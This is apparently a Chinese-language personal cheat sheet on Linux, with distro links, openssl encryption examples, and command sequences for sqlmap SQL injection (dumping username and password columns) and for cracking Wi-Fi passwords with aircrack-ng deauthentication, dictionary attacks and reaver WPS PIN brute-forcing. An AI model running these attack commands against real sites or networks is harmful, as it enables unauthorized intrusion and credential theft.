# [Home](../README.md)
## [Linux](https://www.apiref.com/linux-zh/linux-command-manual.html)

![linux](https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg)

### Linux发行版
- [Ubuntu](http://www.ubuntu.com/)
- [Fedora](http://fedoraproject.org/)
- [Debian](http://www.debian.org/)
- [CentOS](http://www.centos.org/)
- [Arch](https://www.archlinux.org/)
- [Kali](https://www.kali.org/)
- [ElementaryOS](https://elementary.io/zh_CN/)
- [Nitrux](https://nxos.org/)

### openssl
> 加密

```shell
echo '明文' | openssl aes-128-cbc -k "key" -base64
```

>解密

```shell
echo "U2FsdGVkX19nGdcPGq41k5Nq92WRzXIkH1YVcBAjJpQ=" | openssl aes-128-cbc -d -k "key" -base64
echo "U2FsdGVkX19nGdcPGq41k5Nq92WRzXIkH1YVcBAjJpQ=" | tr ' ' '\n' | openssl aes-128-cbc -d -k "key" -base64
```

```shell
#Standard commands
asn1parse         ca                ciphers           cms
crl               crl2pkcs7         dgst              dhparam
dsa               dsaparam          ec                ecparam
enc               engine            errstr            gendsa
genpkey           genrsa            help              list
nseq              ocsp              passwd            pkcs12
pkcs7             pkcs8             pkey              pkeyparam
pkeyutl           prime             rand              rehash
req               rsa               rsautl            s_client
s_server          s_time            sess_id           smime
speed             spkac             srp               storeutl
ts                verify            version           x509

#Message Digest commands (see the `dgst' command for more details)
blake2b512        blake2s256        gost              md4
md5               mdc2              rmd160            sha1
sha224            sha256            sha3-224          sha3-256
sha3-384          sha3-512          sha384            sha512
sha512-224        sha512-256        shake128          shake256
sm3

#Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64
bf                bf-cbc            bf-cfb            bf-ecb
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb
cast5-ofb         des               des-cbc           des-cfb
des-ecb           des-ede           des-ede-cbc       des-ede-cfb
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb
des-ede3-ofb      des-ofb           des3              desx
rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc
rc2-cfb           rc2-ecb           rc2-ofb           rc4
rc4-40            seed              seed-cbc          seed-cfb
seed-ecb          seed-ofb          sm4-cbc           sm4-cfb
sm4-ctr           sm4-ecb           sm4-ofb           zlib
```
### SQL注入
```shell
sqlmap -u url --dbs --current-user	
sqlmap -u url --dbms mysql -D dbName --tables
sqlmap -u url --dbms mysql -T admin --columns
sqlmap -u url --dbms mysql -T admin -C field1, field2 --dump

sqlmap -u url?id=1
sqlmap -u url?id=1 --dbs
sqlmap -u url?id=1 --current-db		#列出当前使用的数据库名
sqlmap -u url?id=1 --tables -D "db_name"
sqlmap -u url?id=1 --columns -T "tb_name" -D "db_name"
sqlmap -u url?id=1 --dump -C "username, password" -T "tb_name" -D "db_name"

sqlmap -u url?id=1 --is-dbs #判断该注入点是否有管理员权限，true表示管理员
```

### wifi密码跑字典
```shell
airmon-ng check kill			#杀死进程
airmon-ng start wlan0			#是wlan0网卡开起monitor mode
airodump-ng wlan0mon			#查看附件wifi
airodump-ng --bssid mac地址 -c CH值 -w crack wlan0mon		#开始抓包

aireplay-ng --deauth 10 -a mac地址 -c 抓到的mac地址 wlan0mon
aircrack-ng -w 密码字典路径 crack-01.cap

airmon-ng stop wlan0mon		#关闭wlan0网卡monitor mode
```
### wifi跑pin码
```shell
airmon-ng start wlan0
wash -i wlan0mon
reaver -i wlan0mon -b mac地址 -S -N -vv -c CH值
```